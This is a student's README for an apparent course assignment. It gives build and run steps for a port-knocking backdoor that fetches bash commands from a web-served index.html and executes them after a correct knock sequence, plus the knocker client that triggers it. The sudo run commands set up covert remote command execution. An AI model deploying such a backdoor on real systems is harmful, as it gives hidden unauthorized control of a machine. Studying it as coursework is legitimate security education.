Name: Rui Shu
Unity ID: rshu
Email: rshu@ncsu.edu

How to run the code:

1. My code requires to install the package named "libcurl4-gnutls-dev", which is added to the package file.
2. make
3. Run the HTTP server with command "python -m SimpleHTTPServer" in the folder which has the file index.html, e.g. /home/rshu/PortKnocking/
4. Run backdoor "sudo ./backdoor configuration-file http://127.0.0.1:8000/index.html", while the bash command is stored in the file named index.html. The backdoor server will read the bash code "ls -al" and execute the command if the server receives right sequence of packets while the ports are from configuration-file.
4. Run knocker to send packets based on configuration-file "sudo ./knocker configuration-file 152.46.17.179". 152.46.17.179 is the server IP address that runs backdoor.

Pay Attention:
The knocker.c code gets local IP address from interface "eth1", for this works for Ubuntu 14.04 base Virtual Machine on VCL, and it might not work for other machine if it has no interface "eth1". I need to fill local IP address into IP header.
